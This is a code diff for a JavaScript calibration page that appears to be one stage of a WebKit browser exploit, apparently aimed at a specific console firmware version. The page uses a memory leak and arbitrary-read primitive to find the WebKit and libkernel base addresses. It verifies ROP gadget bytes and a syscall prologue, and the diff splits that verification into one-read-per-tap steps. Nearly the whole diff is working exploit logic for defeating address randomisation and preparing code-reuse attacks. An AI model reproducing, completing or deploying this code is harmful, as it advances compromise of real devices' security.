@@ -93,10 +93,18 @@ function wireGroomBar() {
 }
 
 let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In;
-let btnStart, btnLite, btnWide, btnVerify, btnCopy, btnClear;
+let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnCopy, btnClear;
 let scanMode = "lite";
 let scanIndex = 0;
 let scanList = [];
+let verifyGadgetOk = 0;
+
+const SS_CANDIDATE = "wk-cal-candidate";
+const SS_VSTEP = "wk-vstep";
+const SS_VGAD_OK = "wk-vgad-ok";
+const SS_LK_STEP = "wk-cal-lk-step";
+const SS_LK_ERROR = "wk-cal-lk-errorFn";
+const SS_LK_W0 = "wk-cal-lk-w0";
 
 function $(id) { return document.getElementById(id); }
 
@@ -122,8 +130,44 @@ function setUi() {
     if (btnLite) btnLite.disabled = busy || !calReady;
     if (btnWide) btnWide.disabled = busy || !calReady;
     if (btnVerify) btnVerify.disabled = busy || !calReady;
+    if (btnSetExpm1) btnSetExpm1.disabled = busy || !calReady;
     if (btnCopy) btnCopy.disabled = busy || !calibrated;
     if (expm1In) expm1In.disabled = busy || !calReady;
+}
+
+function preCalTrim() {
+    if (lines.length > 6) {
+        lines.splice(0, lines.length - 6);
+        if (outEl) outEl.textContent = lines.join("\n");
+    }
+}
+
+function clearVerifyProgress() {
+    verifyGadgetOk = 0;
+    try {
+        sessionStorage.removeItem(SS_VSTEP);
+        sessionStorage.removeItem(SS_VGAD_OK);
+        sessionStorage.removeItem(SS_LK_STEP);
+        sessionStorage.removeItem(SS_LK_ERROR);
+        sessionStorage.removeItem(SS_LK_W0);
+    } catch (_) { }
+}
+
+function clearLkProgress() {
+    try {
+        sessionStorage.removeItem(SS_LK_STEP);
+        sessionStorage.removeItem(SS_LK_ERROR);
+        sessionStorage.removeItem(SS_LK_W0);
+    } catch (_) { }
+}
+
+function activeDelta() {
+    const typed = parseExpm1(expm1In && expm1In.value);
+    if (typed > 0) return typed;
+    try {
+        const c = parseInt(sessionStorage.getItem(SS_CANDIDATE) || "0", 16);
+        return c > 0 ? c : 0;
+    } catch (_) { return 0; }
 }
 
 function parseAddr(str) {
@@ -187,6 +231,8 @@ function liteSpanK() {
 }
 
 function captureNativeFn(p, off) {
+    const cached = loadNativeFnOverride();
+    if (cached) return cached;
     const mOff = off.wk_JSFunction_m_function || 0x28;
     const cell = p.leakval(Math.expm1);
     const mid = read8p(p, cell.add32(0x18));
@@ -195,6 +241,15 @@ function captureNativeFn(p, off) {
     if (!fn) return null;
     try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
     return fn;
+}
+
+function tryElfOnce(p, fn, delta) {
+    if (!(delta > 0)) return null;
+    const base = fn.sub32(delta);
+    if (!alignedWebkitBase(base)) return null;
+    const magic = read4p(p, base);
+    if (magic !== ELF_MAGIC) return null;
+    return { delta, base };
 }
 
 function loadNativeFnOverride() {
@@ -244,85 +299,19 @@ function checkGadgetBytes(p, base, rva, pat) {
     return true;
 }
 
-function verifyDelta(p, fn, delta, off, readsBudget) {
-    const out = {
+function applyCalibration(delta, base, libkernelBase, gadgetOk) {
+    const result = {
         delta,
-        webkitBase: null,
-        libkernelBase: null,
-        elf: false,
-        gadgetOk: 0,
+        webkitBase: base,
+        libkernelBase: libkernelBase || null,
+        elf: true,
+        gadgetOk: gadgetOk || 0,
         gadgetTotal: GADGET_CHECKS.length,
-        gadgetMiss: [],
-        reads: 0,
-        ok: false,
+        ok: true,
     };
-    if (!(delta > 0)) return out;
-
-    const base = fn.sub32(delta);
-    out.webkitBase = base;
-    if (!alignedWebkitBase(base)) {
-        out.reason = "base not 0x4000-aligned";
-        return out;
-    }
-
-    if (readsBudget != null && out.reads >= readsBudget) return out;
-    const magic = read4p(p, base);
-    out.reads++;
-    out.elf = magic === ELF_MAGIC;
-    if (!out.elf) {
-        out.reason = "no ELF magic @ base (got 0x"
-            + (magic == null ? "null" : (magic >>> 0).toString(16)) + ")";
-        return out;
-    }
-    mark("ELF-OK", "base=" + base + " delta=0x" + delta.toString(16));
-
-    for (const [name, key, pat] of GADGET_CHECKS) {
-        if (readsBudget != null && out.reads + pat.filter(x => x !== null).length > readsBudget + 20)
-            break;
-        const rva = off[key];
-        if (rva == null) {
-            out.gadgetMiss.push(name + "(no rva)");
-            continue;
-        }
-        for (let i = 0; i < pat.length; i++) {
-            if (pat[i] !== null) out.reads++;
-        }
-        if (checkGadgetBytes(p, base, rva, pat)) {
-            out.gadgetOk++;
-            mark("GADGET-OK", name + " @+" + rva.toString(16));
-        } else {
-            out.gadgetMiss.push(name);
-            mark("GADGET-BAD", name + " @+" + (rva == null ? "?" : rva.toString(16)));
-        }
-    }
-
-    if (off.wk___imp___error && off.k__error) {
-        const errorFn = read8p(p, base.add32(off.wk___imp___error));
-        out.reads++;
-        if (errorFn) {
-            const lk = errorFn.sub32(off.k__error);
-            const w0 = read4p(p, lk);
-            const w1 = read4p(p, lk.add32(4));
-            out.reads += 2;
-            if (w0 != null && w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
-                out.libkernelBase = lk;
-                mark("LK-OK", String(lk));
-            } else {
-                mark("LK-BAD", "prologue w0=0x" + (w0 == null ? "?" : (w0 >>> 0).toString(16))
-                    + " w1=0x" + (w1 == null ? "?" : (w1 >>> 0).toString(16)));
-                out.lkHint = "wk___imp___error / k__error may differ on 13.52";
-            }
-        } else {
-            mark("LK-BAD", "IAT __error unreadable @ webkit+" + off.wk___imp___error.toString(16));
-        }
-    }
-
-    out.ok = out.elf && out.gadgetOk >= 6;
-    return out;
-}
-
-function applyCalibration(result) {
     calibrated = result;
+    clearVerifyProgress();
+    clearLkProgress();
     const live = {
         fw_status: "calibrated on hardware (index_cal.html)",
         wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
@@ -332,7 +321,8 @@ function applyCalibration(result) {
     };
     if (tableOff.wk___imp___error) live.wk___imp___error = tableOff.wk___imp___error;
     if (tableOff.k__error) live.k__error = tableOff.k__error;
-    for (const [, key] of GADGET_CHECKS) {
+    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+        const key = GADGET_CHECKS[gi][1];
         if (tableOff[key] != null) live[key] = tableOff[key];
     }
 
@@ -465,7 +455,8 @@ async function runStart() {
 
         ready = true;
         logNativeFnInfo(nativeFn);
-        rebuildScanList("lite");
+        mark("HINT-CAL", "lite scan = 1 read/tap (ELF only). Then Set expm1 or Verify step.");
+        mark("HINT-OOM", "never leakval during cal — nativeFn saved at Start");
 
         const pre = parseExpm1(params.get("expm1"));
         if (pre > 0 && expm1In) expm1In.value = pre.toString(16);
@@ -485,6 +476,7 @@ async function runScanStep(mode) {
     if (busy || !ready || !window.p || !nativeFn) return;
     busy = true;
     setUi();
+    preCalTrim();
 
     if (scanMode !== mode || scanList.length === 0) rebuildScanList(mode);
     const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";
@@ -492,67 +484,197 @@ async function runScanStep(mode) {
     try {
         if (scanIndex >= scanList.length) {
             mark("CAL-FAIL", mode + " scan exhausted (" + scanList.length + " tries)");
-            mark("HINT", "type expm1 manually + verify, or ?min= / ?max= for wide range");
-            state("scan miss — try manual verify", "warn");
+            mark("HINT", "type expm1 + Set expm1 (0 reads), or Verify step");
+            state("scan miss — try manual", "warn");
             return;
         }
 
         const delta = scanList[scanIndex];
         mark("CAL-TRY", (scanIndex + 1) + "/" + scanList.length
-            + " 0x" + delta.toString(16));
+            + " 0x" + delta.toString(16) + " (1 read)");
 
-        await new Promise(r => setTimeout(r, 48));
+        await new Promise(r => setTimeout(r, 64));
 
-        const p = window.p;
-        const quick = read4p(p, nativeFn.sub32(delta));
-        if (quick !== ELF_MAGIC) {
+        const hit = tryElfOnce(window.p, nativeFn, delta);
+        scanIndex++;
+        try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }
+
+        if (!hit) {
             mark("ELF-MISS", "0x" + delta.toString(16));
-            scanIndex++;
-            try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }
             state(mode + " " + scanIndex + "/" + scanList.length + " — tap again", "warn");
             return;
         }
 
-        const full = verifyDelta(p, nativeFn, delta, tableOff);
-        scanIndex++;
-        try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }
+        try {
+            sessionStorage.setItem(SS_CANDIDATE, String(hit.delta));
+            sessionStorage.removeItem(key);
+        } catch (_) { }
+        clearVerifyProgress();
+        if (expm1In) expm1In.value = hit.delta.toString(16);
+        updateResultPanel();
 
-        if (full.ok) {
-            try { sessionStorage.removeItem(key); } catch (_) { }
-            applyCalibration(full);
-        } else {
-            mark("CAL-NEAR", "ELF hit but gadgets=" + full.gadgetOk + "/" + full.gadgetTotal
-                + (full.reason ? " " + full.reason : ""));
-            state("ELF only — try next or manual", "warn");
-        }
+        mark("CAL-ELF-HIT", "expm1=0x" + hit.delta.toString(16) + " base=" + hit.base);
+        mark("CAL-MORE", "tap Verify step (1 read/tap) OR Set expm1 if skipping verify");
+        state("ELF hit — Verify step or Set expm1", "ok");
     } finally {
         busy = false;
         setUi();
     }
 }
 
-async function runVerifyManual() {
-    if (busy || !ready || !window.p || !nativeFn) return;
+function runSetExpm1() {
+    if (busy || !ready || !nativeFn) return;
+    preCalTrim();
     const delta = parseExpm1(expm1In && expm1In.value);
     if (!(delta > 0)) {
         mark("CAL-FAIL", "bad expm1 hex");
         state("invalid expm1", "bad");
         return;
     }
+    const base = nativeFn.sub32(delta);
+    try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
+    clearVerifyProgress();
+    updateResultPanel();
+    mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base + " (0 reads)");
+    mark("HINT", "optional: Verify step confirms ELF+gadgets (1 read/tap)");
+    state("expm1 set (0 reads) — Verify step optional", "ok");
+}
+
+async function runVerifyStep() {
+    if (busy || !ready || !window.p || !nativeFn) return;
+    const delta = activeDelta();
+    if (!(delta > 0)) {
+        mark("CAL-FAIL", "no expm1 — lite scan or type hex first");
+        state("need expm1 delta", "bad");
+        return;
+    }
 
     busy = true;
     setUi();
-    mark("CAL-VERIFY", "0x" + delta.toString(16) + " (full gadget + IAT check)");
-    state("verifying…", "warn");
+    preCalTrim();
+
+    const p = window.p;
+    const base = nativeFn.sub32(delta);
+    let step = 0;
+    try { step = parseInt(sessionStorage.getItem(SS_VSTEP) || "0", 10) || 0; } catch (_) { }
+    try { verifyGadgetOk = parseInt(sessionStorage.getItem(SS_VGAD_OK) || "0", 10) || 0; } catch (_) { }
+
+    const totalSteps = 1 + GADGET_CHECKS.length + 3;
+    mark("VERIFY-STEP", (step + 1) + "/" + totalSteps + " expm1=0x" + delta.toString(16));
+    state("verify " + (step + 1) + "/" + totalSteps + "…", "warn");
 
     try {
-        await new Promise(r => setTimeout(r, 32));
-        const full = verifyDelta(window.p, nativeFn, delta, tableOff);
-        updateResultPanel();
-        if (full.ok) applyCalibration(full);
-        else {
-            mark("CAL-FAIL", full.reason || ("gadgets " + full.gadgetOk + "/" + full.gadgetTotal));
-            state("verify failed — try adjacent 0x4000 step", "warn");
+        await new Promise(r => setTimeout(r, 64));
+
+        if (step === 0) {
+            const magic = read4p(p, base);
+            if (magic !== ELF_MAGIC) {
+                clearVerifyProgress();
+                mark("CAL-FAIL", "ELF bad @ base=" + base);
+                state("ELF verify failed", "bad");
+                return;
+            }
+            mark("CAL-ELF-OK", "base=" + base);
+            try { sessionStorage.setItem(SS_VSTEP, "1"); } catch (_) { }
+            mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ")");
+            return;
+        }
+
+        if (step >= 1 && step <= GADGET_CHECKS.length) {
+            const gi = step - 1;
+            const row = GADGET_CHECKS[gi];
+            const name = row[0];
+            const key = row[1];
+            const pat = row[2];
+            const rva = tableOff[key];
+            if (rva == null) {
+                mark("GADGET-SKIP", name + " (no rva in table)");
+            } else if (checkGadgetBytes(p, base, rva, pat)) {
+                verifyGadgetOk++;
+                mark("GADGET-OK", name + " @+" + rva.toString(16));
+            } else {
+                mark("GADGET-BAD", name + " @+" + rva.toString(16));
+            }
+            try {
+                sessionStorage.setItem(SS_VGAD_OK, String(verifyGadgetOk));
+                sessionStorage.setItem(SS_VSTEP, String(step + 1));
+            } catch (_) { }
+            if (step + 1 <= GADGET_CHECKS.length)
+                mark("CAL-MORE", "tap Verify step (" + (step + 2) + "/" + totalSteps + ")");
+            else
+                mark("CAL-MORE", "tap Verify step for libkernel (1 read/tap ×3)");
+            return;
+        }
+
+        const lkStep = step - 1 - GADGET_CHECKS.length;
+        if (!tableOff.wk___imp___error || !tableOff.k__error) {
+            if (verifyGadgetOk >= 6) {
+                applyCalibration(delta, base, null, verifyGadgetOk);
+            } else {
+                mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length);
+            }
+            return;
+        }
+
+        if (lkStep === 0) {
+            mark("LK-TRY", "1/3 IAT webkit+" + tableOff.wk___imp___error.toString(16));
+            const errorFn = read8p(p, base.add32(tableOff.wk___imp___error));
+            if (!errorFn) {
+                clearLkProgress();
+                mark("LK-FAIL", "IAT read failed");
+                if (verifyGadgetOk >= 6)
+                    applyCalibration(delta, base, null, verifyGadgetOk);
+                return;
+            }
+            try {
+                sessionStorage.setItem(SS_LK_ERROR, String(errorFn));
+                sessionStorage.setItem(SS_LK_STEP, "1");
+                sessionStorage.setItem(SS_VSTEP, String(step + 1));
+            } catch (_) { }
+            mark("CAL-MORE", "tap Verify step (libkernel 2/3)");
+            return;
+        }
+
+        const errorFn = parseAddr(sessionStorage.getItem(SS_LK_ERROR));
+        const lk = errorFn ? errorFn.sub32(tableOff.k__error) : null;
+
+        if (lkStep === 1) {
+            mark("LK-TRY", "2/3 __error @ " + lk);
+            const w0 = read4p(p, lk);
+            if (w0 == null) {
+                clearLkProgress();
+                mark("LK-FAIL", "lk read failed");
+                if (verifyGadgetOk >= 6)
+                    applyCalibration(delta, base, null, verifyGadgetOk);
+                return;
+            }
+            try {
+                sessionStorage.setItem(SS_LK_W0, "0x" + (w0 >>> 0).toString(16));
+                sessionStorage.setItem(SS_LK_STEP, "2");
+                sessionStorage.setItem(SS_VSTEP, String(step + 1));
+            } catch (_) { }
+            mark("CAL-MORE", "tap Verify step (libkernel 3/3)");
+            return;
+        }
+
+        mark("LK-TRY", "3/3 verify prologue");
+        const w0 = parseInt(sessionStorage.getItem(SS_LK_W0) || "0", 16);
+        const w1 = read4p(p, lk.add32(4));
+        clearLkProgress();
+
+        let lkBase = null;
+        if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
+            lkBase = lk;
+            mark("LK-OK", String(lk));
+        } else {
+            mark("LK-BAD", "prologue mismatch");
+        }
+
+        if (verifyGadgetOk >= 6) {
+            applyCalibration(delta, base, lkBase, verifyGadgetOk);
+        } else {
+            mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " (need ≥6)");
+            state("verify failed — wrong expm1?", "warn");
         }
     } finally {
         busy = false;
@@ -604,6 +726,7 @@ function init() {
     btnLite = $("btn-lite");
     btnWide = $("btn-wide");
     btnVerify = $("btn-verify");
+    btnSetExpm1 = $("btn-set-expm1");
     btnCopy = $("btn-copy");
     btnClear = $("btn-clear");
 
@@ -615,7 +738,8 @@ function init() {
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnLite, function () { return runScanStep("lite"); });
     wireClick(btnWide, function () { return runScanStep("wide"); });
-    wireClick(btnVerify, function () { return runVerifyManual(); });
+    wireClick(btnVerify, function () { return runVerifyStep(); });
+    wireClick(btnSetExpm1, runSetExpm1);
     wireClick(btnCopy, runCopy);
     wireClick(btnClear, function () {
         lines.length = 0;
@@ -633,7 +757,7 @@ function init() {
 
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "lite ±" + liteSpanK() + "×0x4000 around table hint; wide uses ?min=&max=");
+    mark("BOOT", "lite/wide = 1 ELF read/tap; Verify step = 1 read/tap; Set expm1 = 0 reads");
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
